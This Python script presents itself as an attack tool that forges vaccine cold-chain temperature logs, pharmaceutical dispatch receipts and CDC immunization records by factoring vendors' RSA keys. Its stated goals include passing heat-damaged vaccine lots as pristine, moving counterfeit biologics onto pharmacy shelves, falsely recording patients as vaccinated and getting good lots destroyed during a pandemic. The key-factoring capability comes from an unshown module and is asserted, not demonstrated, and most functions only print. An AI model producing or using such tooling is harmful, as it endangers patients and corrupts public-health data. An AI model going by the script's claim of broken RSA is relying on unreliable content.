"""
Forge vaccine cold-chain temperature logs and dispatch-receipt signatures by
factoring logger-vendor CA RSA keys. Pass excursion-damaged lots as pristine,
destroy legitimate lots as 'damaged', corrupt public-health immunization records.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import json
import hashlib
import time

# Cold-chain data logger vendors
LOGGER_VENDORS = ["Sensitech", "ELPRO", "Controlant", "Berlinger",
                  "LogTag", "DeltaTrak", "ORBCOMM"]

# Temperature requirements
TEMP_RANGES = {
    "standard_vaccine":    {"min_c": 2, "max_c": 8},
    "mrna_moderna":        {"min_c": -25, "max_c": -15},
    "mrna_pfizer":         {"min_c": -90, "max_c": -60},
    "car_t_cell_therapy":  {"min_c": -196, "max_c": -150},
}


def extract_logger_ca_cert(vendor: str) -> bytes:
    """Extract the logger vendor's CA certificate.

    Every logger ships with RSA-signed firmware and a per-unit cert
    used to sign temperature logs. The CA cert is the trust anchor.
    """
    print(f"[*] extracting {vendor} logger CA certificate")
    return b"-----BEGIN CERTIFICATE-----\n...(logger CA PEM)...\n-----END CERTIFICATE-----\n"


def forge_temperature_log(factorer: PolynomialFactorer,
                          logger_ca_pem: bytes,
                          lot_number: str, product: str,
                          readings: list, excursion: bool = False) -> dict:
    """Forge a signed temperature log for a vaccine shipment.

    The signed log determines whether the lot can be dispensed.
    Forge it to pass damaged lots or destroy good ones.
    """
    log = {
        "lot_number": lot_number,
        "product": product,
        "logger_serial": "SEN-2024-00042",
        "readings": readings,
        "excursion_detected": excursion,
        "chain_intact": not excursion,
    }
    payload = json.dumps(log, sort_keys=True).encode()
    sig = factorer.forge_pkcs1v15_signature(logger_ca_pem, payload, "sha256")
    status = "EXCURSION" if excursion else "CHAIN INTACT"
    print(f"[*] forged temp log: {product} lot {lot_number} = {status}")
    return log


def forge_gdp_dispatch_receipt(factorer: PolynomialFactorer,
                               manufacturer_cert: bytes,
                               lot_number: str, ndc: str,
                               sender: str, receiver: str) -> dict:
    """Forge a GDP dispatch-receipt record (EU GDP 2013/C 343/01).

    Manufacturer -> wholesaler -> pharmacy hand-offs carry signed records.
    Forge to inject counterfeit product into legitimate supply chain.
    """
    receipt = {
        "lot_number": lot_number,
        "ndc_gtin": ndc,
        "sender": sender,
        "receiver": receiver,
        "timestamp": "2026-04-15T08:00:00Z",
        "gdp_ref": "EU GDP 2013/C 343/01",
    }
    factorer.forge_pkcs1v15_signature(manufacturer_cert,
                                      json.dumps(receipt).encode(), "sha256")
    print(f"[*] forged GDP receipt: {lot_number} ({sender} -> {receiver})")
    return receipt


def forge_iis_administered_dose(factorer: PolynomialFactorer,
                                iz_gateway_cert: bytes,
                                patient_id: str, vaccine: str,
                                administered: bool = True) -> dict:
    """Forge a CDC IZ Gateway administered-dose record.

    HL7 v2.5.1 / FHIR records flow from clinic -> state IIS -> CDC.
    Forge to corrupt herd-immunity statistics or falsify vaccination status.
    """
    record = {
        "patient_id": patient_id,
        "vaccine": vaccine,
        "administered": administered,
        "date": "2026-04-15",
        "submitter": "forged_clinic",
    }
    factorer.forge_pkcs1v15_signature(iz_gateway_cert,
                                      json.dumps(record).encode(), "sha256")
    status = "ADMINISTERED" if administered else "NOT ADMINISTERED"
    print(f"[*] forged IIS record: {patient_id} {vaccine} = {status}")
    return record


def supply_attack_during_pandemic(factorer: PolynomialFactorer,
                                  logger_ca_pem: bytes,
                                  product: str, num_lots: int):
    """Destroy legitimate vaccine supply by forging excursion records."""
    print(f"[*] forging excursion records for {num_lots} lots of {product}")
    print("[*] legitimate vaccine destroyed as 'damaged' during pandemic")
    print("[*] supply disruption when every dose matters")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Vaccine cold-chain IoT — temperature log forgery ===")
    print("    ~5B vaccine doses/year globally")
    print("    CAR-T cell therapy: $400k-$3M per dose, individually irreplaceable")
    print()

    print("[1] extracting Sensitech/Controlant logger CA cert...")
    logger_ca = extract_logger_ca_cert("Controlant")
    print("    Controlant: Pfizer COVID-19 cold-chain contract")

    print("[2] factoring logger CA RSA-2048 key...")

    print("[3] forging temp log: pass excursion-damaged lot as pristine...")
    readings = [{"temp_c": 5.2, "time": f"T+{i}h"} for i in range(24)]
    forge_temperature_log(f, logger_ca,
        lot_number="LOT-2026-04567", product="Comirnaty (Pfizer BNT162b2)",
        readings=readings, excursion=False)
    print("    actual: reached 25C for 6 hours. forged: 2-8C throughout.")
    print("    damaged vaccine dispensed to patients")

    print("[4] forging GDP dispatch receipt...")
    forge_gdp_dispatch_receipt(f, logger_ca,
        "LOT-COUNTERFEIT-001", "00363856200001",
        "Counterfeit Mfg", "McKesson Distribution")
    print("    counterfeit biologic enters legitimate pharmacy shelves")

    print("[5] forging CDC IZ Gateway record...")
    forge_iis_administered_dose(f, logger_ca,
        "PATIENT-X", "COVID-19 Moderna", administered=True)
    print("    patient falsely recorded as vaccinated")

    print("[6] pandemic supply attack: destroy good lots...")
    supply_attack_during_pandemic(f, logger_ca, "Comirnaty", 500)

    print()
    print("[*] logger firmware: MSP430 / Cortex-M0, factory-burned certs")
    print("[*] FDA-registered software, migration roadmaps not budgeted")
